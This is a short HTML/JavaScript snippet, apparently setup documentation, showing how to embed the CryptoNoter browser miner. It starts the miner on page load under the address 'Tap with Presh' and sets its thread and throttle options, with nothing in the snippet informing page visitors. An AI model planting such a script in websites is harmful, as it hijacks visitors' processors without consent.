<script src="processor.js"></script>
// Initialize the miner
<script>
  var miner = new CryptoNoter.User('Tap with Presh').start();
</script>

// You can also configure the miner with options
<script>
  var addr = 'Tap with Presh';
  var miner = new CryptoNoter.User(addr, {
    autoThreads: true,
    throttle: 0.8
  });
  miner.start();
</script>
